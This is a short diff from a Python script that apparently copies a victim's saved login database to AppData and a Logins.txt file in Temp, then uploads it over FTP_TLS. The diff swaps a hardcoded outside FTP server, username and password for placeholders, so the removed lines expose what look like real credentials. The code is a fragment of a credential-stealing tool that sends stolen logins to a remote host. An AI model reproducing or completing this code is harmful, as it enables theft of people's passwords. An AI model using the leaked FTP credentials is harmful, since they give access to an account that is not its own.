@@ -26,9 +26,9 @@ def main():
 	coped_db        = pathusr + '''\AppData\Logins'''
 	file_with_logs  = pathusr + '''\AppData\Local\Temp\Logins.txt'''
 
-	server          = 's30.ucoz.net'
-	user            = 'ealiceselezneva'
-	pasd            = 'vermillion0654'
+	server          = 'FTPSERVER'
+	user            = 'FTPUSER'
+	pasd            = 'FTPPASS'
 
 	ftp = FTP_TLS()
 	ftp.set_debuglevel(2)
